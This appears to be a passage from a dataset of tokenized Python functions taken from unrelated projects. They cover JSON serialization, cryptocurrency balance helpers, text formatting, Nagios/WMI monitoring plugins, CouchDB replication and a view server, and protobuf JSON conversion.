error was: " + str ( e ) )
def get_translated_data ( self ) : j = { } for k in self . data : d = { } for l in self . data [ k ] : d [ self . translation_keys [ l ] ] = self . data [ k ] [ l ] j [ k ] = d return j
def get_json ( self , prettyprint = False , translate = True ) : j = [ ] if translate : d = self . get_translated_data ( ) else : d = self . data for k in d : j . append ( d [ k ] ) if prettyprint : j = json . dumps ( j , indent = 2 , separators = ( ',' , ': ' ) ) else : j = json . dumps ( j ) return j
def get_json_tuples ( self , prettyprint = False , translate = True ) : j = self . get_json ( prettyprint , translate ) if len ( j ) > 2 : if prettyprint : j = j [ 1 : - 2 ] + ",\n" else : j = j [ 1 : - 1 ] + "," else : j = "" return j
def _generate_html_diff ( self , expected_fn , expected_lines , obtained_fn , obtained_lines ) : import difflib differ = difflib . HtmlDiff ( ) return differ . make_file ( fromlines = expected_lines , fromdesc = expected_fn , tolines = obtained_lines , todesc = obtained_fn , )
def broadcast_tx ( self , address , amount , secret , secondsecret = None , vendorfield = '' ) : peer = random . choice ( self . PEERS ) park = Park ( peer , 4001 , constants . ARK_NETHASH , '1.1.1' ) return park . transactions ( ) . create ( address , str ( amount ) , vendorfield , secret , secondsecret )
def register ( self , service , name = '' ) : try : is_model = issubclass ( service , orb . Model ) except StandardError : is_model = False # expose an ORB table dynamically as a service if is_model : self . services [ service . schema ( ) . dbname ( ) ] = ( ModelService , service ) else : super ( OrbApiFactory , self ) . register ( service , name = name )
def main ( ) : plugin = Register ( ) if plugin . args . option == 'sql' : plugin . sql_handle ( ) else : plugin . unknown ( "Unknown actions." )
def main ( ) : global DEBUG argd = docopt ( USAGESTR , version = VERSIONSTR , script = SCRIPT ) DEBUG = argd [ '--debug' ] width = parse_int ( argd [ '--width' ] or DEFAULT_WIDTH ) or 1 indent = parse_int ( argd [ '--indent' ] or ( argd [ '--INDENT' ] or 0 ) ) prepend = ' ' * ( indent * 4 ) if prepend and argd [ '--indent' ] : # Smart indent, change max width based on indention. width -= len ( prepend ) userprepend = argd [ '--prepend' ] or ( argd [ '--PREPEND' ] or '' ) prepend = '' . join ( ( prepend , userprepend ) ) if argd [ '--prepend' ] : # Smart indent, change max width based on prepended text. width -= len ( userprepend ) userappend = argd [ '--append' ] or ( argd [ '--APPEND' ] or '' ) if argd [ '--append' ] : width -= len ( userappend ) if argd [ 'WORDS' ] : # Try each argument as a file name. argd [ 'WORDS' ] = ( ( try_read_file ( w ) if len ( w ) < 256 else w ) for w in argd [ 'WORDS' ] ) words = ' ' . join ( ( w for w in argd [ 'WORDS' ] if w ) ) else : # No text/filenames provided, use stdin for input. words = read_stdin ( ) block = FormatBlock ( words ) . iter_format_block ( chars = argd [ '--chars' ] , fill = argd [ '--fill' ] , prepend = prepend , strip_first = argd [ '--stripfirst' ] , append = userappend , strip_last = argd [ '--striplast' ] , width = width , newlines = argd [ '--newlines' ] , lstrip = argd [ '--lstrip' ] , ) for i , line in enumerate ( block ) : if argd [ '--enumerate' ] : # Current line number format supports up to 999 lines before # messing up. Who would format 1000 lines like this anyway? print ( '{: >3}: {}' . format ( i + 1 , line ) ) else : print ( line ) return 0
def debug ( * args , * * kwargs ) : if not ( DEBUG and args ) : return None # Include parent class name when given. parent = kwargs . get ( 'parent' , None ) with suppress ( KeyError ) : kwargs . pop ( 'parent' ) # Go back more than once when given. backlevel = kwargs . get ( 'back' , 1 ) with suppress ( KeyError ) : kwargs . pop ( 'back' ) frame = inspect . currentframe ( ) # Go back a number of frames (usually 1). while backlevel > 0 : frame = frame . f_back backlevel -= 1 fname = os . path . split ( frame . f_code . co_filename ) [ - 1 ] lineno = frame . f_lineno if parent : func = '{}.{}' . format ( parent . __class__ . __name__ , frame . f_code . co_name ) else : func = frame . f_code . co_name lineinfo = '{}:{} {}: ' . format ( C ( fname , 'yellow' ) , C ( str ( lineno ) . ljust ( 4 ) , 'blue' ) , C ( ) . join ( C ( func , 'magenta' ) , '()' ) . ljust ( 20 ) ) # Patch args to stay compatible with print(). pargs = list ( C ( a , 'green' ) . str ( ) for a in args ) pargs [ 0 ] = '' . join ( ( lineinfo , pargs [ 0 ] ) ) print_err ( * pargs , * * kwargs )
def close ( self ) : self . _tempfile . close ( ) self . _process . terminate ( ) if self . _process . is_alive ( ) : self . _process . kill ( )
def init_app ( self , app ) : app . config . setdefault ( "TRACY_REQUIRE_CLIENT" , False ) if not hasattr ( app , 'extensions' ) : app . extensions = { } app . extensions [ 'restpoints' ] = self app . before_request ( self . _before ) app . after_request ( self . _after )
def _before ( self ) : # Don't trace excluded routes. if request . path in self . excluded_routes : request . _tracy_exclude = True return request . _tracy_start_time = monotonic ( ) client = request . headers . get ( trace_header_client , None ) require_client = current_app . config . get ( "TRACY_REQUIRE_CLIENT" , False ) if client is None and require_client : abort ( 400 , "Missing %s header" % trace_header_client ) request . _tracy_client = client request . _tracy_id = request . headers . get ( trace_header_id , new_id ( ) )
def expand_words ( self , line , width = 60 ) : if not line . strip ( ) : return line # Word index, which word to insert on (cycles between 1->len(words)) wordi = 1 while len ( strip_codes ( line ) ) < width : wordendi = self . find_word_end ( line , wordi ) if wordendi < 0 : # Reached the end?, try starting at the front again. wordi = 1 wordendi = self . find_word_end ( line , wordi ) if wordendi < 0 : # There are no spaces to expand, just prepend one. line = '' . join ( ( ' ' , line ) ) else : line = ' ' . join ( ( line [ : wordendi ] , line [ wordendi : ] ) ) wordi += 1 # Don't push a single word all the way to the right. if ' ' not in strip_codes ( line ) . strip ( ) : return line . replace ( ' ' , '' ) return line
def iter_add_text ( self , lines , prepend = None , append = None ) : if ( prepend is None ) and ( append is None ) : yield from lines else : # Build up a format string, with optional {prepend}/{append} fmtpcs = [ '{prepend}' ] if prepend else [ ] fmtpcs . append ( '{line}' ) if append : fmtpcs . append ( '{append}' ) fmtstr = '' . join ( fmtpcs ) yield from ( fmtstr . format ( prepend = prepend , line = line , append = append ) for line in lines )
def iter_char_block ( self , text = None , width = 60 , fmtfunc = str ) : if width < 1 : width = 1 text = ( self . text if text is None else text ) or '' text = ' ' . join ( text . split ( '\n' ) ) escapecodes = get_codes ( text ) if not escapecodes : # No escape codes, use simple method. yield from ( fmtfunc ( text [ i : i + width ] ) for i in range ( 0 , len ( text ) , width ) ) else : # Ignore escape codes when counting. blockwidth = 0 block = [ ] for i , s in enumerate ( get_indices_list ( text ) ) : block . append ( s ) if len ( s ) == 1 : # Normal char. blockwidth += 1 if blockwidth == width : yield '' . join ( block ) block = [ ] blockwidth = 0 if block : yield '' . join ( block )
def iter_space_block ( self , text = None , width = 60 , fmtfunc = str ) : if width < 1 : width = 1 curline = '' text = ( self . text if text is None else text ) or '' for word in text . split ( ) : possibleline = ' ' . join ( ( curline , word ) ) if curline else word # Ignore escape codes. codelen = sum ( len ( s ) for s in get_codes ( possibleline ) ) reallen = len ( possibleline ) - codelen if reallen > width : # This word would exceed the limit, start a new line with # it. yield fmtfunc ( curline ) curline = word else : curline = possibleline # yield the last line. if curline : yield fmtfunc ( curline )
def run ( self ) : self . log . debug ( 'consumer is running...' ) self . running = True while self . running : self . upload ( ) self . log . debug ( 'consumer exited.' )
def upload ( self ) : success = False batch = self . next ( ) if len ( batch ) == 0 : return False try : self . request ( batch ) success = True except Exception as e : self . log . error ( 'error uploading: %s' , e ) success = False if self . on_error : self . on_error ( e , batch ) finally : # cleanup for item in batch : self . queue . task_done ( ) return success
def next ( self ) : queue = self . queue items = [ ] item = self . next_item ( ) if item is None : return items items . append ( item ) while len ( items ) < self . upload_size and not queue . empty ( ) : item = self . next_item ( ) if item : items . append ( item ) return items
def next_item ( self ) : queue = self . queue try : item = queue . get ( block = True , timeout = 5 ) return item except Exception : return None
def request ( self , batch , attempt = 0 ) : try : q = self . api . new_queue ( ) for msg in batch : q . add ( msg [ 'event' ] , msg [ 'value' ] , source = msg [ 'source' ] ) q . submit ( ) except : if attempt > self . retries : raise self . request ( batch , attempt + 1 )
def main ( ) : ep = requests . get ( TRELLO_API_DOC ) . content root = html . fromstring ( ep ) links = root . xpath ( '//a[contains(@class, "reference internal")]/@href' ) pages = [ requests . get ( TRELLO_API_DOC + u ) for u in links if u . endswith ( 'index.html' ) ] endpoints = [ ] for page in pages : root = html . fromstring ( page . content ) sections = root . xpath ( '//div[@class="section"]/h2/..' ) for sec in sections : ep_html = etree . tostring ( sec ) . decode ( 'utf-8' ) ep_text = html2text ( ep_html ) . splitlines ( ) match = EP_DESC_REGEX . match ( ep_text [ 0 ] ) if not match : continue ep_method , ep_url = match . groups ( ) ep_text [ 0 ] = ' ' . join ( [ ep_method , ep_url ] ) ep_doc = b64encode ( gzip . compress ( '\n' . join ( ep_text ) . encode ( 'utf-8' ) ) ) endpoints . append ( ( ep_method , ep_url , ep_doc ) ) print ( yaml . dump ( create_tree ( endpoints ) ) )
def quit ( self ) : try : self . ftp . quit ( ) self . logger . debug ( "quit connect succeed." ) except ftplib . Error as e : self . unknown ( "quit connect error: %s" % e )
def query ( self , wql ) : try : self . __wql = [ 'wmic' , '-U' , self . args . domain + '\\' + self . args . user + '%' + self . args . password , '//' + self . args . host , '--namespace' , self . args . namespace , '--delimiter' , self . args . delimiter , wql ] self . logger . debug ( "wql: {}" . format ( self . __wql ) ) self . __output = subprocess . check_output ( self . __wql ) self . logger . debug ( "output: {}" . format ( self . __output ) ) self . logger . debug ( "wmi connect succeed." ) self . __wmi_output = self . __output . splitlines ( ) [ 1 : ] self . logger . debug ( "wmi_output: {}" . format ( self . __wmi_output ) ) self . __csv_header = csv . DictReader ( self . __wmi_output , delimiter = '|' ) self . logger . debug ( "csv_header: {}" . format ( self . __csv_header ) ) return list ( self . __csv_header ) except subprocess . CalledProcessError as e : self . unknown ( "Connect by wmi and run wql error: %s" % e )
def log_file ( self , url = None ) : if url is None : url = self . url f = re . sub ( "file://" , "" , url ) try : with open ( f , "a" ) as of : of . write ( str ( self . store . get_json_tuples ( True ) ) ) except IOError as e : print ( e ) print ( "Could not write the content to the file.." )
def log_post ( self , url = None , credentials = None , do_verify_certificate = True ) : if url is None : url = self . url if credentials is None : credentials = self . credentials if do_verify_certificate is None : do_verify_certificate = self . do_verify_certificate if credentials and "base64" in credentials : headers = { "Content-Type" : "application/json" , 'Authorization' : 'Basic %s' % credentials [ "base64" ] } else : headers = { "Content-Type" : "application/json" } try : request = requests . post ( url , headers = headers , data = self . store . get_json ( ) , verify = do_verify_certificate ) except httplib . IncompleteRead as e : request = e . partial
def register_credentials ( self , credentials = None , user = None , user_file = None , password = None , password_file = None ) : # lets store all kind of credential data into this dict if credentials is not None : self . credentials = credentials else : self . credentials = { } # set the user from CLI or file if user : self . credentials [ "user" ] = user elif user_file : with open ( user_file , "r" ) as of : # what would the file entry look like? pattern = re . compile ( "^user: " ) for l in of : if re . match ( pattern , l ) : # strip away the newline l = l [ 0 : - 1 ] self . credentials [ "user" ] = re . sub ( pattern , "" , l ) # remove any surrounding quotes if self . credentials [ "user" ] [ 0 : 1 ] == '"' and self . credentials [ "user" ] [ - 1 : ] == '"' : self . credentials [ "user" ] = self . credentials [ "user" ] [ 1 : - 1 ] # set the password from CLI or file if password : self . credentials [ "password" ] = password elif password_file : with open ( password_file , "r" ) as of : # what would the file entry look like? pattern = re . compile ( "^password: " ) for l in of : if re . match ( pattern , l ) : # strip away the newline l = l [ 0 : - 1 ] self . credentials [ "password" ] = re . sub ( pattern , "" , l ) # remove any surrounding quotes if self . credentials [ "password" ] [ 0 : 1 ] == '"' and self . credentials [ "password" ] [ - 1 : ] == '"' : self . credentials [ "password" ] = self . credentials [ "password" ] [ 1 : - 1 ] # if both user and password is set, #  1. encode to base 64 for basic auth if "user" in self . credentials and "password" in self . credentials : c = self . credentials [ "user" ] + ":" + self . credentials [ "password" ] self . credentials [ "base64" ] = b64encode ( c . encode ( ) ) . decode ( "ascii" )
def set_connection ( host = None , database = None , user = None , password = None ) : c . CONNECTION [ 'HOST' ] = host c . CONNECTION [ 'DATABASE' ] = database c . CONNECTION [ 'USER' ] = user c . CONNECTION [ 'PASSWORD' ] = password
def set_delegate ( address = None , pubkey = None , secret = None ) : c . DELEGATE [ 'ADDRESS' ] = address c . DELEGATE [ 'PUBKEY' ] = pubkey c . DELEGATE [ 'PASSPHRASE' ] = secret
def balance ( address ) : txhistory = Address . transactions ( address ) balance = 0 for i in txhistory : if i . recipientId == address : balance += i . amount if i . senderId == address : balance -= ( i . amount + i . fee ) delegates = Delegate . delegates ( ) for i in delegates : if address == i . address : forged_blocks = Delegate . blocks ( i . pubkey ) for block in forged_blocks : balance += ( block . reward + block . totalFee ) if balance < 0 : height = Node . height ( ) logger . fatal ( 'Negative balance for address {0}, Nodeheight: {1)' . format ( address , height ) ) raise NegativeBalanceError ( 'Negative balance for address {0}, Nodeheight: {1)' . format ( address , height ) ) return balance
def balance_over_time ( address ) : forged_blocks = None txhistory = Address . transactions ( address ) delegates = Delegate . delegates ( ) for i in delegates : if address == i . address : forged_blocks = Delegate . blocks ( i . pubkey ) balance_over_time = [ ] balance = 0 block = 0 Balance = namedtuple ( 'balance' , 'timestamp amount' ) for tx in txhistory : if forged_blocks : while forged_blocks [ block ] . timestamp <= tx . timestamp : balance += ( forged_blocks [ block ] . reward + forged_blocks [ block ] . totalFee ) balance_over_time . append ( Balance ( timestamp = forged_blocks [ block ] . timestamp , amount = balance ) ) block += 1 if tx . senderId == address : balance -= ( tx . amount + tx . fee ) res = Balance ( timestamp = tx . timestamp , amount = balance ) balance_over_time . append ( res ) if tx . recipientId == address : balance += tx . amount res = Balance ( timestamp = tx . timestamp , amount = balance ) balance_over_time . append ( res ) if forged_blocks and block <= len ( forged_blocks ) - 1 : if forged_blocks [ block ] . timestamp > txhistory [ - 1 ] . timestamp : for i in forged_blocks [ block : ] : balance += ( i . reward + i . totalFee ) res = Balance ( timestamp = i . timestamp , amount = balance ) balance_over_time . append ( res ) return balance_over_time
def _real_time_thread ( self ) : while self . ws_client . connected ( ) : if self . die : break if self . pause : sleep ( 5 ) continue message = self . ws_client . receive ( ) if message is None : break message_type = message [ 'type' ] if message_type == 'error' : continue if message [ 'sequence' ] <= self . sequence : continue if message_type == 'open' : self . _handle_open ( message ) elif message_type == 'match' : self . _handle_match ( message ) elif message_type == 'done' : self . _handle_done ( message ) elif message_type == 'change' : self . _handle_change ( message ) else : continue self . ws_client . disconnect ( )
def _keep_alive_thread ( self ) : while True : with self . _lock : if self . connected ( ) : self . _ws . ping ( ) else : self . disconnect ( ) self . _thread = None return sleep ( 30 )
def connect ( self ) : if not self . connected ( ) : self . _ws = create_connection ( self . WS_URI ) message = { 'type' : self . WS_TYPE , 'product_id' : self . WS_PRODUCT_ID } self . _ws . send ( dumps ( message ) ) # There will be only one keep alive thread per client instance with self . _lock : if not self . _thread : thread = Thread ( target = self . _keep_alive_thread , args = [ ] ) thread . start ( )
def handle_data ( self , data ) : if data . strip ( ) : data = djeffify_string ( data ) self . djhtml += data
def _wrap_color ( self , code , text , format = None , style = None ) : color = None if code [ : 3 ] == self . bg . PREFIX : color = self . bg . COLORS . get ( code , None ) if not color : color = self . fg . COLORS . get ( code , None ) if not color : raise Exception ( 'Color code not found' ) if format and format not in self . formats : raise Exception ( 'Color format not found' ) fmt = "0;" if format == 'bold' : fmt = "1;" elif format == 'underline' : fmt = "4;" # Manage the format parts = color . split ( '[' ) color = '{0}[{1}{2}' . format ( parts [ 0 ] , fmt , parts [ 1 ] ) if self . has_colors and self . colors_enabled : # Set brightness st = '' if style : st = self . st . COLORS . get ( style , '' ) return "{0}{1}{2}{3}" . format ( st , color , text , self . st . COLORS [ 'reset_all' ] ) else : return text
def collect_links ( self , env = None ) : for asset in self . assets . values ( ) : if asset . has_bundles ( ) : asset . collect_files ( ) if env is None : env = self . config . env if env == static_bundle . ENV_PRODUCTION : self . _minify ( emulate = True ) self . _add_url_prefix ( )
def replicate_existing ( source_db , target_db ) : # Get the server from which to manage the replication. server = shortcuts . get_server ( ) logger = logging . getLogger ( 'relax.couchdb.replicate' ) logger . debug ( 'POST ' + urlparse . urljoin ( server . resource . uri , '/_replicate' ) ) source , target = specifier_to_db ( source_db ) , specifier_to_db ( target_db ) logger . debug ( 'Source DB: %s' % ( source , ) ) logger . debug ( 'Target DB: %s' % ( target , ) ) try : resp_headers , resp_body = server . resource . post ( path = '/_replicate' , content = json . dumps ( { 'source' : source , 'target' : target } ) ) except couchdb . client . ServerError , exc : logger . error ( 'Replication failed.' ) raise ReplicationError ( exc . args ) result = resp_body [ 'history' ] [ 0 ] if resp_body [ 'ok' ] : logger . info ( 'Replication %s... successful!' % ( resp_body [ 'session_id' ] [ : 6 ] , ) ) logger . info ( 'Replication started: ' + result [ 'start_time' ] ) logger . info ( 'Replication finished: ' + result [ 'end_time' ] ) result [ 'start_time' ] = datetime . datetime . strptime ( result [ 'start_time' ] , '%a, %d %b %Y %H:%M:%S GMT' ) result [ 'end_time' ] = datetime . datetime . strptime ( result [ 'end_time' ] , '%a, %d %b %Y %H:%M:%S GMT' ) timedelta = result [ 'end_time' ] - result [ 'start_time' ] if timedelta . days : logger . info ( 'Replication took %d days and %.2f seconds.' % ( timedelta . days , timedelta . seconds + ( timedelta . microseconds * ( 1e-6 ) ) ) ) else : logger . info ( 'Replication took %.2f seconds.' % ( timedelta . seconds + ( timedelta . microseconds * ( 1e-6 ) ) ) ) # Prepare the 'result' dictionary. result [ 'ok' ] = resp_body [ 'ok' ] result [ 'session_id' ] = resp_body [ 'session_id' ] result [ 'source_last_seq' ] = resp_body [ 'source_last_seq' ] # Info-log the number of docs read/written and checked/found. if result [ 'docs_read' ] == 1 : docs_read = '1 document read' else : docs_read = '%d documents read' % ( result [ 'docs_read' ] , ) if result [ 'docs_written' ] == 1 : docs_written = '1 document written' else : docs_written = '%d documents written' % ( result [ 'docs_written' ] , ) if result [ 'missing_checked' ] == 1 : missing_checked = 'Checked for 1 missing document, found %d.' % ( result [ 'missing_found' ] , ) else : missing_checked = 'Checked for %d missing documents, found %d.' % ( result [ 'missing_checked' ] , result [ 'missing_found' ] , ) logging . info ( '%s, %s' % ( docs_read , docs_written ) ) logging . info ( missing_checked ) return result else : logger . error ( 'Replication %s... failed.' % ( resp_body [ 'session_id' ] [ : 6 ] , ) ) result [ 'ok' ] = resp_body [ 'ok' ] result [ 'session_id' ] = resp_body [ 'session_id' ] result [ 'source_last_seq' ] = resp_body [ 'source_last_seq' ] raise ReplicationFailure ( resp_headers , result )
def require ( name , field , data_type ) : if not isinstance ( field , data_type ) : msg = '{0} must have {1}, got: {2}' . format ( name , data_type , field ) raise AssertionError ( msg )
def flush ( self ) : queue = self . queue size = queue . qsize ( ) queue . join ( ) self . log . debug ( 'successfully flushed %s items.' , size )
def open ( name = None , fileobj = None , closefd = True ) : return Guesser ( ) . open ( name = name , fileobj = fileobj , closefd = closefd )
def marv ( ctx , config , loglevel , logfilter , verbosity ) : if config is None : cwd = os . path . abspath ( os . path . curdir ) while cwd != os . path . sep : config = os . path . join ( cwd , 'marv.conf' ) if os . path . exists ( config ) : break cwd = os . path . dirname ( cwd ) else : config = '/etc/marv/marv.conf' if not os . path . exists ( config ) : config = None ctx . obj = config setup_logging ( loglevel , verbosity , logfilter )
def main ( global_config , * * settings ) : set_cache_regions_from_settings ( settings ) config = Configurator ( settings = settings ) config . include ( 'cms' ) config . configure_celery ( global_config [ '__file__' ] ) return config . make_wsgi_app ( )
def get_function ( function_name ) : module , basename = str ( function_name ) . rsplit ( '.' , 1 ) try : return getattr ( __import__ ( module , fromlist = [ basename ] ) , basename ) except ( ImportError , AttributeError ) : raise FunctionNotFound ( function_name )
def handle_add_fun ( self , function_name ) : function_name = function_name . strip ( ) try : function = get_function ( function_name ) except Exception , exc : self . wfile . write ( js_error ( exc ) + NEWLINE ) return # This tests to see if the function has been decorated with the view # server synchronisation decorator (``decorate_view``). if not getattr ( function , 'view_decorated' , None ) : self . functions [ function_name ] = ( self . function_counter , function ) # The decorator gets called with the logger function. else : self . functions [ function_name ] = ( self . function_counter , function ( self . log ) ) self . function_counter += 1 return True
def handle_map_doc ( self , document ) : # This uses the stored set of functions, sorted by order of addition. for function in sorted ( self . functions . values ( ) , key = lambda x : x [ 0 ] ) : try : # It has to be run through ``list``, because it may be a #generator function. yield [ list ( function ( document ) ) ] except Exception , exc : # Otherwise, return an empty list and log the event. yield [ ] self . log ( repr ( exc ) )
def handle_reduce ( self , reduce_function_names , mapped_docs ) : reduce_functions = [ ] # This gets a large list of reduction functions, given their names. for reduce_function_name in reduce_function_names : try : reduce_function = get_function ( reduce_function_name ) if getattr ( reduce_function , 'view_decorated' , None ) : reduce_function = reduce_function ( self . log ) reduce_functions . append ( reduce_function ) except Exception , exc : self . log ( repr ( exc ) ) reduce_functions . append ( lambda * args , * * kwargs : None ) # Transform lots of (key, value) pairs into one (keys, values) pair. keys , values = zip ( ( key , value ) for ( ( key , doc_id ) , value ) in mapped_docs ) # This gets the list of results from the reduction functions. results = [ ] for reduce_function in reduce_functions : try : results . append ( reduce_function ( keys , values , rereduce = False ) ) except Exception , exc : self . log ( repr ( exc ) ) results . append ( None ) return [ True , results ]
def handle_rereduce ( self , reduce_function_names , values ) : # This gets a large list of reduction functions, given their names. reduce_functions = [ ] for reduce_function_name in reduce_function_names : try : reduce_function = get_function ( reduce_function_name ) if getattr ( reduce_function , 'view_decorated' , None ) : reduce_function = reduce_function ( self . log ) reduce_functions . append ( reduce_function ) except Exception , exc : self . log ( repr ( exc ) ) reduce_functions . append ( lambda * args , * * kwargs : None ) # This gets the list of results from those functions. results = [ ] for reduce_function in reduce_functions : try : results . append ( reduce_function ( None , values , rereduce = True ) ) except Exception , exc : self . log ( repr ( exc ) ) results . append ( None ) return [ True , results ]
def handle_validate ( self , function_name , new_doc , old_doc , user_ctx ) : try : function = get_function ( function_name ) except Exception , exc : self . log ( repr ( exc ) ) return False try : return function ( new_doc , old_doc , user_ctx ) except Exception , exc : self . log ( repr ( exc ) ) return repr ( exc )
def handle ( self ) : while True : try : line = self . rfile . readline ( ) try : # All input data are lines of JSON like the following: #   ["<cmd_name>" "<cmd_arg1>" "<cmd_arg2>" ...] # So I handle this by dispatching to various methods. cmd = json . loads ( line ) except Exception , exc : # Sometimes errors come up. Once again, I can't predict # anything, but can at least tell CouchDB about the error. self . wfile . write ( repr ( exc ) + NEWLINE ) continue else : #Automagically get the command handler. handler = getattr ( self , 'handle_' + cmd [ 0 ] , None ) if not handler : # We are ready to not find commands. It probably won't # happen, but fortune favours the prepared. self . wfile . write ( repr ( CommandNotFound ( cmd [ 0 ] ) ) + NEWLINE ) continue return_value = handler ( * cmd [ 1 : ] ) if not return_value : continue # We write the output back to CouchDB. self . wfile . write ( one_lineify ( json . dumps ( return_value ) ) + NEWLINE ) except Exception , exc : self . wfile . write ( repr ( exc ) + NEWLINE ) continue
def log ( self , string ) : self . wfile . write ( json . dumps ( { 'log' : string } ) + NEWLINE )
def revoke_token ( self , token , callback ) : yield Task ( self . data_store . remove , 'tokens' , token = token ) callback ( )
def merge_ordered ( ordereds : typing . Iterable [ typing . Any ] ) -> typing . Iterable [ typing . Any ] : seen_set = set ( ) add_seen = seen_set . add return reversed ( tuple ( map ( lambda obj : add_seen ( obj ) or obj , filterfalse ( seen_set . __contains__ , chain . from_iterable ( map ( reversed , reversed ( ordereds ) ) ) , ) , ) ) )
def main ( ) : plugin = Register ( ) if plugin . args . option == 'filenumber' : plugin . filenumber_handle ( ) elif plugin . args . option == 'fileage' : plugin . fileage_handle ( ) elif plugin . args . option == 'sqlserverlocks' : plugin . sqlserverlocks_handle ( ) else : plugin . unknown ( "Unknown actions." )
def filenumber_handle ( self ) : self . file_list = [ ] self . count = 0 status = self . ok if self . args . recursion : self . __result , self . __file_list = self . __get_folder ( self . args . path ) else : self . __result , self . __file_list = self . __get_file ( self . args . path ) # Compare the vlaue. if self . __result > self . args . critical : status = self . critical elif self . __result > self . args . warning : status = self . warning else : status = self . ok # Output self . shortoutput = "Found {0} files in {1}." . format ( self . __result , self . args . path ) self . logger . debug ( "file_list: {}" . format ( self . __file_list ) ) [ self . longoutput . append ( file_data . get ( 'Name' ) ) for file_data in self . __file_list ] self . perfdata . append ( "{path}={result};{warn};{crit};0;" . format ( crit = self . args . critical , warn = self . args . warning , result = self . __result , path = self . args . path ) ) # Return status with message to Nagios. status ( self . output ( long_output_limit = None ) ) self . logger . debug ( "Return status and exit to Nagios." )
def __get_current_datetime ( self ) : self . wql_time = "SELECT LocalDateTime FROM Win32_OperatingSystem" self . current_time = self . query ( self . wql_time ) # [{'LocalDateTime': '20160824161431.977000+480'}]' self . current_time_string = str ( self . current_time [ 0 ] . get ( 'LocalDateTime' ) . split ( '.' ) [ 0 ] ) # '20160824161431' self . current_time_format = datetime . datetime . strptime ( self . current_time_string , '%Y%m%d%H%M%S' ) # param: datetime.datetime(2016, 8, 24, 16, 14, 31) -> type: # datetime.datetime return self . current_time_format
def fileage_handle ( self ) : self . file_list = [ ] self . ok_file = [ ] self . warn_file = [ ] self . crit_file = [ ] status = self . ok if self . args . recursion : self . __file_list = self . __get_folder ( self . args . path ) else : self . __file_list = self . __get_file ( self . args . path ) self . logger . debug ( "file_list: {}" . format ( self . __file_list ) ) # [{'LastModified': '20160824142017.737101+480', 'Name': 'd:\\test\\1.txt'}, # {'LastModified': '20160824142021.392101+480', 'Name': 'd:\\test\\2.txt'}, # {'LastModified': '20160824142106.460101+480', 'Name': 'd:\\test\\test1\\21.txt'}] for file_dict in self . __file_list : self . filename = file_dict . get ( 'Name' ) if self . filename and self . filename != 'Name' : self . logger . debug ( "===== start to compare {} =====" . format ( self . filename ) ) self . file_datetime_string = file_dict . get ( 'LastModified' ) . split ( '.' ) [ 0 ] self . file_datetime = datetime . datetime . strptime ( self . file_datetime_string , '%Y%m%d%H%M%S' ) self . logger . debug ( "file_datetime: {}" . format ( self . file_datetime ) ) self . current_datetime = self . __get_current_datetime ( ) self . logger . debug ( "current_datetime: {}" . format ( self . current_datetime ) ) self . __delta_datetime = self . current_datetime - self . file_datetime self . logger . debug ( "delta_datetime: {}" . format ( self . __delta_datetime ) ) self . logger . debug ( "warn_datetime: {}" . format ( datetime . timedelta ( minutes = self . args . warning ) ) ) self . logger . debug ( "crit_datetime: {}" . format ( datetime . timedelta ( minutes = self . args . critical ) ) ) if self . __delta_datetime > datetime . timedelta ( minutes = self . args . critical ) : self . crit_file . append ( self . filename ) elif self . __delta_datetime > datetime . timedelta ( minutes = self . args . warning ) : self . warn_file . append ( self . filename ) else : self . ok_file . append ( self . filename ) # Compare the vlaue. if self . crit_file : status = self . critical elif self . warn_file : status = self . warning else : status = self . ok # Output self . shortoutput = "Found {0} files out of date." . format ( len ( self . crit_file ) ) if self . crit_file : self . longoutput . append ( "===== Critical File out of date ====" ) [ self . longoutput . append ( filename ) for filename in self . crit_file if self . crit_file ] if self . warn_file : self . longoutput . append ( "===== Warning File out of date ====" ) [ self . longoutput . append ( filename ) for filename in self . warn_file if self . warn_file ] if self . ok_file : self . longoutput . append ( "===== OK File out of date ====" ) [ self . longoutput . append ( filename ) for filename in self . ok_file if self . ok_file ] self . perfdata . append ( "{path}={result};{warn};{crit};0;" . format ( crit = self . args . critical , warn = self . args . warning , result = len ( self . crit_file ) , path = self . args . drive + self . args . path ) ) # Return status with message to Nagios. status ( self . output ( long_output_limit = None ) ) self . logger . debug ( "Return status and exit to Nagios." )
def get_version ( relpath ) : from os . path import dirname , join if '__file__' not in globals ( ) : # Allow to use function interactively root = '.' else : root = dirname ( __file__ ) # The code below reads text file with unknown encoding in # in Python2/3 compatible way. Reading this text file # without specifying encoding will fail in Python 3 on some # systems (see http://goo.gl/5XmOH). Specifying encoding as # open() parameter is incompatible with Python 2 # cp437 is the encoding without missing points, safe against: #   UnicodeDecodeError: 'charmap' codec can't decode byte... for line in open ( join ( root , relpath ) , 'rb' ) : line = line . decode ( 'cp437' ) if '__version__' in line : if '"' in line : # __version__ = "0.9" return line . split ( '"' ) [ 1 ] elif "'" in line : return line . split ( "'" ) [ 1 ]
def GetTopLevelContainingType ( self ) : desc = self while desc . containing_type is not None : desc = desc . containing_type return desc
def FindMethodByName ( self , name ) : for method in self . methods : if name == method . name : return method return None
def main ( ) : plugin = Register ( ) if plugin . args . option == 'sqlserverlocks' : plugin . sqlserverlocks_handle ( ) else : plugin . unknown ( "Unknown actions." )
def _MessageToJsonObject ( message , including_default_value_fields ) : message_descriptor = message . DESCRIPTOR full_name = message_descriptor . full_name if _IsWrapperMessage ( message_descriptor ) : return _WrapperMessageToJsonObject ( message ) if full_name in _WKTJSONMETHODS : return _WKTJSONMETHODS [ full_name ] [ 0 ] ( message , including_default_value_fields ) js = { } return _RegularMessageToJsonObject ( message , js , including_default_value_fields )
def _StructMessageToJsonObject ( message , unused_including_default = False ) : fields = message . fields ret = { } for key in fields : ret [ key ] = _ValueMessageToJsonObject ( fields [ key ] ) return ret
def _ConvertValueMessage ( value , message ) : if isinstance ( value , dict ) : _ConvertStructMessage ( value , message . struct_value ) elif isinstance ( value , list ) : _ConvertListValueMessage ( value , message . list_value ) elif value is None : message . null_value = 0 elif isinstance ( value , bool ) : message . bool_value = value elif isinstance ( value , six . string_types ) : message . string_value = value elif isinstance ( value , _INT_OR_FLOAT ) : message . number_value = value else : raise ParseError ( 'Unexpected type for Value message.' )
def _ConvertListValueMessage ( value , message ) : if not isinstance ( value , list ) : raise ParseError ( 'ListValue must be in [] which is {0}.' . format ( value ) ) message . ClearField ( 'values' ) for item in value : _ConvertValueMessage ( item , message . values . add ( ) )
def _ConvertStructMessage ( value , message ) : if not isinstance ( value , dict ) : raise ParseError ( 'Struct must be in a dict which is {0}.' . format ( value ) ) for key in value : _ConvertValueMessage ( value [ key ] , message . fields [ key ] ) return
